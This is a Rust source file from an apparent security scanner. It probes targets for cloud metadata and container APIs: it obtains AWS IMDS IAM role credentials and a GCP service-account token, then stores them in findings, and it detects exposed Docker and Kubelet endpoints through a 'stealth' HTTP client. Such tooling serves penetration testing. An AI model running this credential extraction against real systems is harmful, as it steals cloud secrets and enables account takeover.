use valayam_models::finding::FindingOwned;
use valayam_models::templates::cloud_sec::CloudTemplate;
use crate::network::http::StealthHttpClient;


/// Executes cloud-specific metadata and container probing sequences.
pub async fn execute_cloud_probe(
    client: &StealthHttpClient,
    target_url: &str,
    template: &CloudTemplate,
) -> Option<FindingOwned> {
    let mut findings = Vec::new();
    let mut severity = "High";
    let provider = template.provider.to_lowercase();

    match provider.as_str() {
        "aws-imds" => {
            // Step 1: Attempt to negotiate IMDSv2 token
            let token_url = format!("{}/latest/api/token", target_url.trim_end_matches('/'));
            let mut headers = std::collections::HashMap::new();
            headers.insert("X-aws-ec2-metadata-token-ttl-seconds".to_string(), "21600".to_string());

            let token = if let Ok(resp) = client.send_request("PUT", &token_url, Some(&headers), None).await {
                if resp.status().is_success() {
                    resp.text().await.ok()
                } else {
                    None
                }
            } else {
                None
            };

            // Step 2: Extract credentials using the token (or attempt IMDSv1 if token failed)
            let mut meta_headers = std::collections::HashMap::new();
            if let Some(t) = token {
                meta_headers.insert("X-aws-ec2-metadata-token".to_string(), t);
            }

            let role_url = format!("{}/latest/meta-data/iam/security-credentials/", target_url.trim_end_matches('/'));
            if let Ok(resp) = client.send_request("GET", &role_url, Some(&meta_headers), None).await {
                if resp.status().is_success() {
                    if let Ok(role_name) = resp.text().await {
                        let cred_url = format!("{}{}", role_url, role_name.trim());
                        if let Ok(cred_resp) = client.send_request("GET", &cred_url, Some(&meta_headers), None).await {
                            if cred_resp.status().is_success() {
                                if let Ok(creds) = cred_resp.text().await {
                                    findings.push(format!("Extracted AWS IAM Credentials for role '{}':\n{}", role_name.trim(), creds));
                                }
                            }
                        }
                    }
                }
            }
        },
        "gcp-metadata" => {
            let meta_url = format!("{}/computeMetadata/v1/instance/service-accounts/default/token", target_url.trim_end_matches('/'));
            let mut headers = std::collections::HashMap::new();
            headers.insert("Metadata-Flavor".to_string(), "Google".to_string());

            if let Ok(resp) = client.send_request("GET", &meta_url, Some(&headers), None).await {
                if resp.status().is_success() {
                    if let Ok(token) = resp.text().await {
                        findings.push(format!("Extracted GCP Default Service Account Token:\n{}", token));
                    }
                }
            }
        },
        "docker" => {
            let docker_url = format!("{}/containers/json", target_url.trim_end_matches('/'));
            if let Ok(resp) = client.send_request("GET", &docker_url, None, None).await {
                if resp.status().is_success() {
                    if let Ok(body) = resp.text().await {
                        if body.contains("\"Id\"") && body.contains("\"Image\"") {
                            findings.push(format!("Exposed Docker Socket API Detected at {}", docker_url));
                            severity = "Critical";
                        }
                    }
                }
            }
        },
        "kubelet" => {
            let kubelet_url = format!("{}/pods", target_url.trim_end_matches('/'));
            if let Ok(resp) = client.send_request("GET", &kubelet_url, None, None).await {
                if resp.status().is_success() {
                    if let Ok(body) = resp.text().await {
                        if body.contains("\"kind\":\"PodList\"") {
                            findings.push(format!("Exposed Kubernetes Kubelet API Detected (Pods list readable) at {}", kubelet_url));
                            severity = "Critical";
                        }
                    }
                }
            }
        },
        _ => {}
    }

    if findings.is_empty() {
        None
    } else {
        Some(FindingOwned {
            template_id: format!("cloud-{}-probe", provider),
            template_name: format!("{} API Discovery", template.provider),
            severity: severity.to_string(),
            target: target_url.to_string(),
            matched_at: findings.join("\n"),
            description: None,
            solution: None,
            extracted_data: None,
            metadata: std::collections::HashMap::new(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cloud_template_struct() {
        let t = CloudTemplate {
            provider: "aws-imds".to_string(),
            action: "extract_credentials".to_string(),
        };
        assert_eq!(t.provider, "aws-imds");
    }
}